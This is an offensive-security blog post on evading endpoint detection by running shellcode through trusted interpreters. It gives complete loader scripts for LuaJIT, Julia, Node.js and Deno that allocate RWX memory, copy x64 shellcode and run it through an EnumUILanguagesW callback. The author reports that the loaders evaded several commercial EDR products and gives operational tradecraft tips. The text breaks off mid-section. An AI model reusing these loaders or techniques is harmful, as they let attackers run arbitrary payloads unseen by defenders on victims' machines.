---
title: Bring Your Own Interpreter - EDR Evasion with LuaJIT, Julia, Node.js, Deno, and Bun
header:
  teaser: "/assets/images/bun.png"
categories:
  - BYOI
tags:
  - LuaJIT
  - Deno
  - Julia
  - Bun
  - Node
  - TypeScript
  - NT Api
  - VirtualAllocExNuma
  - EnumUILanguagesW
  - NtSetTimer
  - '2026'
  - g3tsyst3m
---

I can't begin to guess as to how many of my carefully crafted PE based loaders got torn apart by a modern EDR solution, and it wasn't because the payload was bad. It was because the *loader* was, as always, too predictable. 

This post is going to go a different direction.  What if the loader wasn't custom at all? What if it was just a trusted, signed PE that can't just outright be blocked? A binary developers require to run their code, and one that carries a good reputation? That's the core idea behind **BYOI - Bring Your Own Interpreter**, at least in my mind.  

In today's post, we'll walk through five interpreters and runtimes, some of which don't ever get any shoutouts these days, and they should! **LuaJIT, Julia, Node.js, Deno, and Bun**.  I'll demonstrate how each one stages my very rudimentary, calc.exe position-independent shellcode through an `EnumUILanguagesW` callback trap. I've also cooked up a couple of bonus scripts, such as a LuaJIT script that walks the IAT to grab an API, and an `NtSetTimer` APC-based script.  I'll cover these more in detail near the end. 

Let's get to it!

The OS Callback Trap ☎️
-

If you've been around offensive Windows for a while, you know the drill: `VirtualAlloc`, copy the shellcode in, `jmp` to it. Simple, effective, and also the exact pattern every EDR is tuned to notice. 😹

The callback trap inverts that picture. Windows gives us APIs where *we* hand the OS a function pointer, and the OS *calls it* for us on its own schedule. One of my favorites for this is `EnumUILanguagesW` from `kernel32.dll`:

```cpp
HRESULT EnumUILanguagesW(
  UILanguageEnumProcW lpUILanguageEnumProc,
  ULONG               dwFlags,
  LANGID              langid,
  LANGID              baseLangid
);
```

This API enumerates the user interface languages installed on the system, and for *each* one, it invokes the callback we supply. Here's the beautiful part: that callback is **any** function pointer. It doesn't receive much scrutiny nor any validation to my knowledge. So the exploit is trivially simple:

1. Allocate `RWX` memory (Which we will use `VirtualAllocExNuma` to accomplish just that!)
2. Copy our position-independent shellcode into it
3. Pass that memory as the `UILanguageEnumProcW` callback
4. Call `EnumUILanguagesW`
5. The OS walks the installed UI languages, and for the first one, it calls our shellcode

At step 5, the instruction pointer lands in our RWX buffer, but the *caller* isn't our script. It's the Windows enumeration machinery in user-mode `ntdll`/`kernel32`, signed Microsoft code, walking a system list. If an EDR is trying to make sense of who called what, the return address it sees is Microsoft's, not a hand-rolled `jmp` from a loader.

Why do we care? Let's line up what the EDR *doesn't* see in the `EnumUILanguagesW` variant:

- **No injection APIs** — no `CreateRemoteThread`, no `WriteProcessMemory`, no `SetThreadContext`. The shellcode never crosses a process boundary; it lives in the interpreter's own address space from the moment it's allocated.
- **No PE file, ever** — there's no second image to load and no section table to parse. The only thing on disk is the interpreter.
- **No direct call site** — our code path never contains an instruction that jumps into the RWX region. The transfer of control is performed by the OS enumeration loop itself.
- **No PE loader signatures** — all of the public PE loader byte patterns that EDR solutions typically scan for simply don't exist.

One thing worth noting before we get into the interpreters: the scripts in this post all allocate their shellcode region with `VirtualAllocExNuma` rather than the classic `VirtualAllocEx`. Under the hood it's the same `NtAllocateVirtualMemory` syscall, but it's a less-trodden Win32 entry point than `VirtualAllocEx`, which some user-mode hooking schemes key on by API name. Not a magic shield, but I like it because it adds a touch more obscurity into the mix.

The Payload
-

Pretty basic really.  Every script in this post drops the same position-independent, API-resolving payload: a 303-byte `x64` shellcode that opens `calc.exe`. Position-independent means it has **zero hardcoded addresses**.  Basically, every function it needs, it finds at runtime by walking the process's own data structures. 

Up first, LuaJIT!
-

Let's start with my favorite: **LuaJIT**. If you know anything about it, you know it's a `JIT` compiler for Lua 5.1. On Windows, it ships as a **single ~500 KB `luajit.exe`** with no installer, no dependencies, and no runtime to babysit. That single-file nature is exactly what makes it perfect for BYOI: you're bringing *one file*.

**Installing LuaJIT**

Grab the Windows 64-bit source files from [Download source files](https://luajit.org/download.html).  I just went with building from source using Microsoft's Visual Studio (MSVC).  Instructons can be found here: [Install Instructions](https://luajit.org/install.html)

Specifically, these instructions for the install:

**Building with MSVC**

Open a "Visual Studio Command Prompt" (x86, x64 or ARM64), cd to the directory with the source code and run these commands:

```bat
cd src
msvcbuild

Note: Check the msvcbuild.bat file for more options. Then follow the installation instructions below.
```

Now that you have your compiled binaries, go ahead and copy luajit.exe and lua51.dll (built in the src directory) to a newly created directory (any location is ok).

Next our script!  Here it is:

**The script: `enumui.lua`**

```lua
local ffi = require("ffi")

ffi.cdef[[
    typedef void* HANDLE;
    typedef unsigned long DWORD;
    typedef int BOOL;
    typedef wchar_t* LPWSTR;
    typedef long long LONG_PTR;
    typedef unsigned long ULONG;

    typedef BOOL (__stdcall *UILANGUAGE_ENUMPROCW)(LPWSTR, LONG_PTR);

    HANDLE GetCurrentProcess();
    void* VirtualAllocExNuma(HANDLE hProcess, void* lpAddress, size_t dwSize, DWORD flAllocationType, DWORD flProtect, DWORD nndPreferred);
    BOOL VirtualFree(void* lpAddress, size_t dwSize, DWORD dwFreeType);
    BOOL EnumUILanguagesW(UILANGUAGE_ENUMPROCW lpUILanguageEnumProc, DWORD dwFlags, LONG_PTR lParam);
]]

local kernel32 = ffi.load("kernel32")

-- Shellcode (calc.exe)
local shellcode = {
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x31, 0xC9, 0x65, 0x48, 0x8B, 0x41, 0x60,
    0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x70, 0x10, 0x48, 0x8B, 0x36, 0x48, 0x8B, 0x36, 0x48, 0x8B,
    0x5E, 0x30, 0x49, 0x89, 0xD8, 0x8B, 0x5B, 0x3C, 0x4C, 0x01, 0xC3, 0x48, 0x31, 0xC9, 0x66, 0x81,
    0xC1, 0xFF, 0x88, 0x48, 0xC1, 0xE9, 0x08, 0x8B, 0x14, 0x0B, 0x4C, 0x01, 0xC2, 0x44, 0x8B, 0x52,
    0x14, 0x4D, 0x31, 0xDB, 0x44, 0x8B, 0x5A, 0x20, 0x4D, 0x01, 0xC3, 0x4C, 0x89, 0xD1, 0x48, 0xB8,
    0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x90, 0x90, 0x48, 0xC1, 0xE0, 0x10, 0x48, 0xC1, 0xE8, 0x10,
    0x50, 0x48, 0xB8, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x41, 0x50, 0x48, 0x89, 0xE0, 0x67,
    0xE3, 0x20, 0x31, 0xDB, 0x41, 0x8B, 0x1C, 0x8B, 0x4C, 0x01, 0xC3, 0x48, 0xFF, 0xC9, 0x4C, 0x8B,
    0x08, 0x4C, 0x39, 0x0B, 0x75, 0xE9, 0x44, 0x8B, 0x48, 0x08, 0x44, 0x39, 0x4B, 0x08, 0x74, 0x03,
    0x75, 0xDD, 0xCC, 0x51, 0x41, 0x5F, 0x49, 0xFF, 0xC7, 0x4D, 0x31, 0xDB, 0x44, 0x8B, 0x5A, 0x1C,
    0x4D, 0x01, 0xC3, 0x43, 0x8B, 0x04, 0xBB, 0x4C, 0x01, 0xC0, 0x50, 0x41, 0x5F, 0x4D, 0x89, 0xFC,
    0x4C, 0x89, 0xC7, 0x4C, 0x89, 0xC1, 0x4D, 0x89, 0xE6, 0x48, 0x89, 0xF9, 0xB8, 0x61, 0x64, 0x90,
    0x90, 0xC1, 0xE0, 0x10, 0xC1, 0xE8, 0x10, 0x50, 0x48, 0xB8, 0x45, 0x78, 0x69, 0x74, 0x54, 0x68,
    0x72, 0x65, 0x50, 0x48, 0x89, 0xE2, 0x48, 0x83, 0xEC, 0x30, 0x41, 0xFF, 0xD6, 0x48, 0x83, 0xC4,
    0x30, 0x49, 0x89, 0xC5, 0x4D, 0x89, 0xE6, 0x48, 0x89, 0xF9, 0x48, 0xB8, 0x57, 0x69, 0x6E, 0x45,
    0x78, 0x65, 0x63, 0x00, 0x50, 0x48, 0x89, 0xE2, 0x48, 0x83, 0xEC, 0x30, 0x41, 0xFF, 0xD6, 0x48,
    0x83, 0xC4, 0x30, 0x49, 0x89, 0xC6, 0x48, 0x83, 0xC4, 0x08, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x50,
    0x48, 0xB8, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x50, 0x48, 0x89, 0xE1, 0xBA, 0x01,
    0x00, 0x00, 0x00, 0x48, 0x83, 0xEC, 0x30, 0x41, 0xFF, 0xD6, 0x31, 0xC9, 0x41, 0xFF, 0xD5
}

local MEM_COMMIT = 0x1000
local MEM_RESERVE = 0x2000
local PAGE_EXECUTE_READWRITE = 0x40
local MEM_RELEASE = 0x8000

local size = #shellcode
local hProcess = kernel32.GetCurrentProcess()

-- Allocate with VirtualAllocExNuma (preferred node 0)
local exec = kernel32.VirtualAllocExNuma(hProcess, nil, size, MEM_COMMIT + MEM_RESERVE, PAGE_EXECUTE_READWRITE, 0)
if exec == nil then
    print("[-] VirtualAllocExNuma failed")
    return
end

-- Copy shellcode
local buf = ffi.cast("uint8_t*", exec)
for i = 1, size do
    buf[i-1] = shellcode[i]
end

print("[+] Executing shellcode via EnumUILanguagesW...")

local callback = ffi.cast("UILANGUAGE_ENUMPROCW", exec)
kernel32.EnumUILanguagesW(callback, 0, 0)

kernel32.VirtualFree(exec, 0, MEM_RELEASE)
print("[+] Done")
```

Two LuaJIT-specific subtleties to point out here.

**Subtlety 1: the 1-based indexing trap.** Lua tables are 1-based, C memory is 0-based, and the shellcode table is a Lua table. The copy loop has to compensate or you'll stage a payload shifted by a byte — which is how you end up with a `#GP` instead of calc:

```lua
local buf = ffi.cast("uint8_t*", exec)
for i = 1, size do
  buf[i - 1] = shellcode[i]
end
```

**Subtlety 2: the named-typedef cast.** In LuaJIT's FFI, the callback parameter is declared with a *named* function-pointer typedef (`UILANGUAGE_ENUMPROCW`), and the shellcode pointer gets explicitly cast to it before being passed in:

```lua
local callback = ffi.cast("UILANGUAGE_ENUMPROCW", exec)
kernel32.EnumUILanguagesW(callback, 0, 0)
```

We declare the callback signature with `ffi.cdef` (rather than passing a raw pointer) means the FFI layer knows the exact calling convention and parameter types

**Running it**

```powershell
PS C:\Users\administrator\lua> .\luajit.exe enumui.lua
[+] Executing shellcode via EnumUILanguagesW...
```

Here's the final result.  I'm testing this against ESET currently with no threat detection triggered.  I've also tested similar code using the same APIs and familiar structure in the past ( a few months back) against Elastic Defend, Microsoft Defender for Endpoint, and Sophos EDR and still flew under the radar.  I say in the recent past because my 30 day trial ran out and didn't feel like re-upping it lol.  😸

<img width="1420" height="850" alt="image" src="https://github.com/user-attachments/assets/fe63d241-16bf-461a-940a-480a45b4f749" />

**Why LuaJIT stays quiet**

- The payload, the allocator call, and the enumeration call all happen **in-process** inside `luajit.exe` -- no cross-process telemetry, no injection events.
- `luajit.exe` is a small, public, well-known binary. It's not a custom hash any blocklist tracks. It rides on general binary reputation, not a target-specific rule.
- The interpreter itself has **no script logging** surface. PowerShell emits script blocks; Python's `ctypes` usage is a textbook pattern defenders already write rules for. A Lua script doing FFI calls has no equivalent default telemetry to my knowledge.  The script content isn't even *visible* to the defender without a memory scan or monitoring using a debugger.

Next up, Julia! (Any Beatles fans here? 😄)
-

**Julia** is a high-performance based, numerical computing language. If you've never touched it, Julia is a full programming language with a JIT, a package ecosystem, and...most relevant to us here: a **built-in FFI** via `ccall`. No third-party packages, no native modules to compile.  Here's how it works:

In Julia, a Foreign Function Interface (FFI) is a built-in mechanism that lets Julia code directly call functions and use data from compiled libraries written in other languages;  most notably C, C++, and Fortran—with virtually zero overhead.

Because Julia compiles down to native machine code using LLVM, it shares the same low-level memory and CPU architecture as C. Unlike languages such as Python (which often require writing complex "glue code" or C-extensions to bridge the gap), Julia treats C and Fortran libraries as first-class citizens.

**How Julia's FFI Works**

Julia uses a built-in macro called @ccall (or the older ccall function) to interact directly with shared libraries (.dll on Windows, .so on Linux, .dylib on macOS).

To make a call, you simply provide:

- The function name and library path where the compiled code lives.
- The return type mapped to a Julia equivalent (e.g., Cdouble maps to Float64).
- The argument types and values being passed in.

This is very useful toward our goal of executing shellcode using low-level C APIs via Julia's ccall interface to allocate, protect, and invoke raw memory regions directly. 👍

**Installing Julia**

```powershell
# Official installer or winget
winget install JuliaLang.Julia
```

You'll get `julia.exe` installed to the following path: `C:\Users\[Username]\AppData\Local\Programs\Julia-1.13.4\bin\julia.exe`. The install is big which is not ideal for BYOI needs (Julia ships its own toolchain), but it's still worth it in my opinion: the loader is a heavyweight, widely-trusted developer tool.

You can of course also download the portable from here too: [https://julialang.org/downloads/manual-downloads/](https://julialang.org/downloads/manual-downloads/)


**The script: `julenum.jl`**

```julia
using Libdl

const kernel32 = Libdl.dlopen("kernel32")

const VirtualAllocExNuma = Libdl.dlsym(kernel32, :VirtualAllocExNuma)
const VirtualFree = Libdl.dlsym(kernel32, :VirtualFree)
const EnumUILanguagesW = Libdl.dlsym(kernel32, :EnumUILanguagesW)
const GetCurrentProcess = Libdl.dlsym(kernel32, :GetCurrentProcess)

const MEM_COMMIT = 0x1000
const MEM_RESERVE = 0x2000
const PAGE_EXECUTE_READWRITE = 0x40
const MEM_RELEASE = 0x8000

# Shellcode (calc.exe)
const shellcode = UInt8[
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x31, 0xC9, 0x65, 0x48, 0x8B, 0x41, 0x60,
    0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x70, 0x10, 0x48, 0x8B, 0x36, 0x48, 0x8B, 0x36, 0x48, 0x8B,
    0x5E, 0x30, 0x49, 0x89, 0xD8, 0x8B, 0x5B, 0x3C, 0x4C, 0x01, 0xC3, 0x48, 0x31, 0xC9, 0x66, 0x81,
    0xC1, 0xFF, 0x88, 0x48, 0xC1, 0xE9, 0x08, 0x8B, 0x14, 0x0B, 0x4C, 0x01, 0xC2, 0x44, 0x8B, 0x52,
    0x14, 0x4D, 0x31, 0xDB, 0x44, 0x8B, 0x5A, 0x20, 0x4D, 0x01, 0xC3, 0x4C, 0x89, 0xD1, 0x48, 0xB8,
    0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x90, 0x90, 0x48, 0xC1, 0xE0, 0x10, 0x48, 0xC1, 0xE8, 0x10,
    0x50, 0x48, 0xB8, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x41, 0x50, 0x48, 0x89, 0xE0, 0x67,
    0xE3, 0x20, 0x31, 0xDB, 0x41, 0x8B, 0x1C, 0x8B, 0x4C, 0x01, 0xC3, 0x48, 0xFF, 0xC9, 0x4C, 0x8B,
    0x08, 0x4C, 0x39, 0x0B, 0x75, 0xE9, 0x44, 0x8B, 0x48, 0x08, 0x44, 0x39, 0x4B, 0x08, 0x74, 0x03,
    0x75, 0xDD, 0xCC, 0x51, 0x41, 0x5F, 0x49, 0xFF, 0xC7, 0x4D, 0x31, 0xDB, 0x44, 0x8B, 0x5A, 0x1C,
    0x4D, 0x01, 0xC3, 0x43, 0x8B, 0x04, 0xBB, 0x4C, 0x01, 0xC0, 0x50, 0x41, 0x5F, 0x4D, 0x89, 0xFC,
    0x4C, 0x89, 0xC7, 0x4C, 0x89, 0xC1, 0x4D, 0x89, 0xE6, 0x48, 0x89, 0xF9, 0xB8, 0x61, 0x64, 0x90,
    0x90, 0xC1, 0xE0, 0x10, 0xC1, 0xE8, 0x10, 0x50, 0x48, 0xB8, 0x45, 0x78, 0x69, 0x74, 0x54, 0x68,
    0x72, 0x65, 0x50, 0x48, 0x89, 0xE2, 0x48, 0x83, 0xEC, 0x30, 0x41, 0xFF, 0xD6, 0x48, 0x83, 0xC4,
    0x30, 0x49, 0x89, 0xC5, 0x4D, 0x89, 0xE6, 0x48, 0x89, 0xF9, 0x48, 0xB8, 0x57, 0x69, 0x6E, 0x45,
    0x78, 0x65, 0x63, 0x00, 0x50, 0x48, 0x89, 0xE2, 0x48, 0x83, 0xEC, 0x30, 0x41, 0xFF, 0xD6, 0x48,
    0x83, 0xC4, 0x30, 0x49, 0x89, 0xC6, 0x48, 0x83, 0xC4, 0x08, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x50,
    0x48, 0xB8, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x50, 0x48, 0x89, 0xE1, 0xBA, 0x01,
    0x00, 0x00, 0x00, 0x48, 0x83, 0xEC, 0x30, 0x41, 0xFF, 0xD6, 0x31, 0xC9, 0x41, 0xFF, 0xD5
]

function main()
    size = length(shellcode)
    hProcess = ccall(GetCurrentProcess, Ptr{Cvoid}, ())

    # VirtualAllocExNuma
    exec = ccall(VirtualAllocExNuma, Ptr{Cvoid},
                 (Ptr{Cvoid}, Ptr{Cvoid}, Csize_t, UInt32, UInt32, UInt32),
                 hProcess, C_NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, 0)

    if exec == C_NULL
        println("[-] VirtualAllocExNuma failed")
        return
    end

    # Copy shellcode
    unsafe_copyto!(Ptr{UInt8}(exec), pointer(shellcode), size)

    println("[+] Executing shellcode via EnumUILanguagesW...")

    # EnumUILanguagesW
    ccall(EnumUILanguagesW, Bool,
          (Ptr{Cvoid}, UInt32, Int64),
          exec, 0, 0)

    # Cleanup
    ccall(VirtualFree, Bool, (Ptr{Cvoid}, Csize_t, UInt32), exec, 0, MEM_RELEASE)
    println("[+] Done")
end

main()
```

Notice how much ceremony **disappears** compared to LuaJIT. There's no `cdef` block, no named typedef, and no indexing gymnastics:

- `Libdl.dlsym` hands us raw function pointers, and `ccall` takes a raw `Ptr` as the callback straight into the enumeration call.  Julia passes the pointer value through without demanding you describe the callback's signature in advance.
- The copy is `unsafe_copyto!` on raw pointers.  The payload is a flat `UInt8` array, so there's no 1-based/0-based seam at all.
- `GetCurrentProcess` is just another `ccall` that returns a handle.

**Running it**

```bat
C:\Users\administrator\AppData\Local\Programs\Julia-1.13.4\bin\julia.exe c:\users\administrator\julenum.jl
[+] Executing shellcode via EnumUILanguagesW...
```

<img width="1420" height="850" alt="image" src="https://github.com/user-attachments/assets/5662a683-1255-4928-9567-edd5b8a9b9d4" />

**Why Julia stays quiet**

- `julia.exe` carries an *excellent* process reputation.  It's installed by data scientists and engineers worldwide. An RWX allocation made from a process the endpoint trusts is a harder sell for a rule engine than the same allocation from a 500 KB file nobody has heard of.
- The FFI is **native to the runtime**: there's no `koffi`-style third-party native module, no package install step, nothing extra on disk for the defender to see.
- One practical caveat: Julia takes a few seconds to spin up (it's a full JIT runtime). That means the interpreter lives a bit longer in telemetry than, say, a one-shot LuaJIT.  That said, every single action it takes while alive is the same quiet in-process allocation + callback we've already covered. And the shellcode buffer stays rooted for the duration of the `ccall`.  The callback never re-enters the Julia runtime, so the GC never touches the buffer mid-enumeration.

Now, on to exploring Node.js!
-

**Node.js** needs no introduction. It's the most ubiquitous JavaScript runtime on Earth (not literally of course 😆), and its process — `node.exe` — is probably the single most trusted "script interpreter" on a developer's endpoint (outside of Python 🐍). We're going to drive it with **koffi**, a modern FFI binding for Node that works on Windows without any native compilation step.

**Installing Node.js + koffi**

```powershell
# Node.js LTS
winget install OpenJS.NodeJS

# koffi gets installed by the script itself on first run (or pre-stage it)
cd C:\Users\administrator\nodeenum
npm install koffi
```

You can always download the standalone too: [https://nodejs.org/en/download](https://nodejs.org/en/download)

**The script: `enumnode.js`**

```javascript
const { execSync } = require('child_process');

// Try to load koffi; install it if missing
let koffi;
try {
    koffi = require('koffi');
} catch (e) {
    console.log('[*] koffi not found, installing...');
    try {
        execSync('npm install koffi', { stdio: 'inherit' });
        koffi = require('koffi');
        console.log('[+] koffi installed successfully');
    } catch (installErr) {
        console.error('[-] Failed to install koffi:', installErr.message);
        process.exit(1);
    }
}

const kernel32 = koffi.load('kernel32.dll');

const GetCurrentProcess = kernel32.func('void* GetCurrentProcess()');
const VirtualAllocExNuma = kernel32.func('void* VirtualAllocExNuma(void* hProcess, void* lpAddress, size_t dwSize, uint32 flAllocationType, uint32 flProtect, uint32 nndPreferred)');
const VirtualFree = kernel32.func('bool VirtualFree(void* lpAddress, size_t dwSize, uint32 dwFreeType)');
const EnumUILanguagesW = kernel32.func('bool EnumUILanguagesW(void* lpUILanguageEnumProc, uint32 dwFlags, intptr lParam)');

const MEM_COMMIT = 0x1000;
const MEM_RESERVE = 0x2000;
const PAGE_EXECUTE_READWRITE = 0x40;
const MEM_RELEASE = 0x8000;

// Shellcode (calc.exe)
const shellcode = Buffer.from([
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x31, 0xC9, 0x65, 0x48, 0x8B, 0x41, 0x60,
    0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x70, 0x10, 0x48, 0x8B, 0x36, 0x48, 0x8B, 0x36, 0x48, 0x8B,
    0x5E, 0x30, 0x49, 0x89, 0xD8, 0x8B, 0x5B, 0x3C, 0x4C, 0x01, 0xC3, 0x48, 0x31, 0xC9, 0x66, 0x81,
    0xC1, 0xFF, 0x88, 0x48, 0xC1, 0xE9, 0x08, 0x8B, 0x14, 0x0B, 0x4C, 0x01, 0xC2, 0x44, 0x8B, 0x52,
    0x14, 0x4D, 0x31, 0xDB, 0x44, 0x8B, 0x5A, 0x20, 0x4D, 0x01, 0xC3, 0x4C, 0x89, 0xD1, 0x48, 0xB8,
    0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x90, 0x90, 0x48, 0xC1, 0xE0, 0x10, 0x48, 0xC1, 0xE8, 0x10,
    0x50, 0x48, 0xB8, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x41, 0x50, 0x48, 0x89, 0xE0, 0x67,
    0xE3, 0x20, 0x31, 0xDB, 0x41, 0x8B, 0x1C, 0x8B, 0x4C, 0x01, 0xC3, 0x48, 0xFF, 0xC9, 0x4C, 0x8B,
    0x08, 0x4C, 0x39, 0x0B, 0x75, 0xE9, 0x44, 0x8B, 0x48, 0x08, 0x44, 0x39, 0x4B, 0x08, 0x74, 0x03,
    0x75, 0xDD, 0xCC, 0x51, 0x41, 0x5F, 0x49, 0xFF, 0xC7, 0x4D, 0x31, 0xDB, 0x44, 0x8B, 0x5A, 0x1C,
    0x4D, 0x01, 0xC3, 0x43, 0x8B, 0x04, 0xBB, 0x4C, 0x01, 0xC0, 0x50, 0x41, 0x5F, 0x4D, 0x89, 0xFC,
    0x4C, 0x89, 0xC7, 0x4C, 0x89, 0xC1, 0x4D, 0x89, 0xE6, 0x48, 0x89, 0xF9, 0xB8, 0x61, 0x64, 0x90,
    0x90, 0xC1, 0xE0, 0x10, 0xC1, 0xE8, 0x10, 0x50, 0x48, 0xB8, 0x45, 0x78, 0x69, 0x74, 0x54, 0x68,
    0x72, 0x65, 0x50, 0x48, 0x89, 0xE2, 0x48, 0x83, 0xEC, 0x30, 0x41, 0xFF, 0xD6, 0x48, 0x83, 0xC4,
    0x30, 0x49, 0x89, 0xC5, 0x4D, 0x89, 0xE6, 0x48, 0x89, 0xF9, 0x48, 0xB8, 0x57, 0x69, 0x6E, 0x45,
    0x78, 0x65, 0x63, 0x00, 0x50, 0x48, 0x89, 0xE2, 0x48, 0x83, 0xEC, 0x30, 0x41, 0xFF, 0xD6, 0x48,
    0x83, 0xC4, 0x30, 0x49, 0x89, 0xC6, 0x48, 0x83, 0xC4, 0x08, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x50,
    0x48, 0xB8, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x50, 0x48, 0x89, 0xE1, 0xBA, 0x01,
    0x00, 0x00, 0x00, 0x48, 0x83, 0xEC, 0x30, 0x41, 0xFF, 0xD6, 0x31, 0xC9, 0x41, 0xFF, 0xD5
]);

const size = shellcode.length;
const hProcess = GetCurrentProcess();

const exec = VirtualAllocExNuma(hProcess, null, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, 0);
if (!exec) {
    console.log('[-] VirtualAllocExNuma failed');
    process.exit(1);
}

// Copy shellcode
const memcpy = koffi.load('msvcrt.dll').func('void* memcpy(void* dest, void* src, size_t n)');
memcpy(exec, shellcode, size);

console.log('[+] Executing shellcode via EnumUILanguagesW...');
EnumUILanguagesW(exec, 0, 0);

VirtualFree(exec, 0, MEM_RELEASE);
console.log('[+] Done');
```

Two Node-specific subtleties:

**Subtlety 1: the self-installing dependency.** The script will happily `npm install koffi` on its first run if it's not present. That's great for a blog demo and **terrible** for fieldcraft — an `npm install` is a network + disk write + `node.exe` child process trifecta that screams "something just happened on this box." For real operations you pre-stage `node_modules` with the target. (The `try/catch` exists purely so the demo works out of the box.)

**Subtlety 2: koffi's string prototypes.** koffi declares functions as C-style strings (`'bool EnumUILanguagesW(void* ...)'`) and passes our `Buffer`'s backing pointer as a plain `void*` callback argument — no typedefs, no casts. The FFI boundary here is thinner than both LuaJIT and Julia. Notice the prototypes are faithful to the real API signatures — `VirtualFree` starts at `lpAddress` (no `hProcess` parameter on the free side), and the payload is staged as a Node `Buffer` rather than a generic typed array, which is just what the ecosystem hands you.

**Running it**

```powershell
PS C:\Users\administrator\nodeenum> node enumnode.js
[+] Executing shellcode via EnumUILanguagesW...
```

<img width="1420" height="850" alt="image" src="https://github.com/user-attachments/assets/2ce4bb1b-a6c1-4837-98e0-9aa6dba2d33c" />

**Why Node stays quiet**

- `node.exe` is the reputation king of this list. It's running in CI pipelines, npm scripts, and dev tooling on half the endpoints in the world. A policy that whitelists `node.exe` is *not* uncommon, and reputation-based scoring works in our favor.
- Everything is in-process: one RWX allocation, one memcpy from `msvcrt` (a totally benign API), one OS-mediated callback.
- No script-block logging. Node has no default "log every script that runs" telemetry — the script content is only visible via memory scanning, same as Lua and Julia.

Time to bring in Deno! 🦖
-

**Deno** is TypeScript/JavaScript's answer to "what if the runtime just *worked* out of the box." One binary, no `package.json`, no `node_modules`, and the part that matters here: a **built-in FFI** via `Deno.dlopen`. That means zero third-party dependencies of any kind. The entire attack surface we're bringing to the box is: 

`deno.exe` + one `.ts` file.

**Installing Deno**

```powershell
winget install DenoLang.Deno
# or the official installer:
# curl -fsSL https://deno.land/install.sh | sh
```

**The script: `denoenum.ts`**

```typescript
const kernel32 = Deno.dlopen("kernel32.dll", {
  GetCurrentProcess: { parameters: [], result: "pointer" },
  VirtualAllocExNuma: {
    parameters: ["pointer", "pointer", "usize", "u32", "u32", "u32"],
    result: "pointer",
  },
  VirtualFree: {
    parameters: ["pointer", "usize", "u32"],
    result: "bool",
  },
  EnumUILanguagesW: {
    parameters: ["pointer", "u32", "isize"],
    result: "bool",
  },
  // Add memcpy from msvcrt for reliable copying
});

const msvcrt = Deno.dlopen("msvcrt.dll", {
  memcpy: {
    parameters: ["pointer", "pointer", "usize"],
    result: "pointer",
  },
});

const MEM_COMMIT = 0x1000;
const MEM_RESERVE = 0x2000;
const PAGE_EXECUTE_READWRITE = 0x40;
const MEM_RELEASE = 0x8000;

// Shellcode (calc.exe)
const shellcode = new Uint8Array([
0x48,0x83,0xec,0x28,0x48,0x83,0xe4,0xf0,0x48,0x31,0xc9,0x65,0x48,0x8b,0x41,0x60,
0x48,0x8b,0x40,0x18,0x48,0x8b,0x70,0x10,0x48,0x8b,0x36,0x48,0x8b,0x36,0x48,0x8b,
0x5e,0x30,0x49,0x89,0xd8,0x8b,0x5b,0x3c,0x4c,0x01,0xc3,0x8b,0x93,0x88,0x00,0x00,
0x00,0x4c,0x01,0xc2,0x44,0x8b,0x52,0x14,0x4d,0x31,0xdb,0x44,0x8b,0x5a,0x20,0x4d,
0x01,0xc3,0x4c,0x89,0xd1,0x48,0xb8,0x57,0x69,0x6e,0x45,0x78,0x65,0x63,0x00,0x50,
0x48,0x89,0xe0,0x48,0x83,0xc4,0x08,0xeb,0x00,0x67,0xe3,0x19,0x31,0xdb,0x41,0x8b,
0x1c,0x8b,0x4c,0x01,0xc3,0x48,0xff,0xc9,0x4c,0x8b,0x08,0x4c,0x39,0x0b,0x74,0x02,
0x75,0xe7,0x51,0xeb,0x01,0xcc,0x41,0x5f,0x78,0x00,0x4c,0x89,0xf9,0x4d,0x31,0xdb,
0x44,0x8b,0x5a,0x24,0x4d,0x01,0xc3,0x48,0xff,0xc1,0x66,0x45,0x8b,0x2c,0x4b,0x4d,
0x31,0xdb,0x44,0x8b,0x5a,0x1c,0x4d,0x01,0xc3,0x43,0x8b,0x04,0xab,0x4c,0x01,0xc0,
0x50,0x78,0x00,0x41,0x5f,0xb8,0x00,0x00,0x00,0x00,0x50,0x48,0xb8,0x63,0x61,0x6c,
0x63,0x2e,0x65,0x78,0x65,0x50,0x48,0x89,0xe1,0xba,0x01,0x00,0x00,0x00,0x48,0x83,
0xec,0x30,0x41,0xff,0xd7,
]);

const size = shellcode.length;
const hProcess = kernel32.symbols.GetCurrentProcess();

const exec = kernel32.symbols.VirtualAllocExNuma(
  hProcess,
  null,
  size,
  MEM_COMMIT | MEM_RESERVE,
  PAGE_EXECUTE_READWRITE,
  0,
);

if (exec === null) {
  console.log("[-] VirtualAllocExNuma failed");
  Deno.exit(1);
}

// Copy shellcode using memcpy
const shellcodePtr = Deno.UnsafePointer.of(shellcode);
msvcrt.symbols.memcpy(exec, shellcodePtr, size);

console.log("[+] Executing shellcode via EnumUILanguagesW...");
kernel32.symbols.EnumUILanguagesW(exec, 0, 0);

kernel32.symbols.VirtualFree(exec, 0, MEM_RELEASE);
console.log("[+] Done");

kernel32.close();
msvcrt.close();
```

Two Deno-specific subtleties worth calling out:

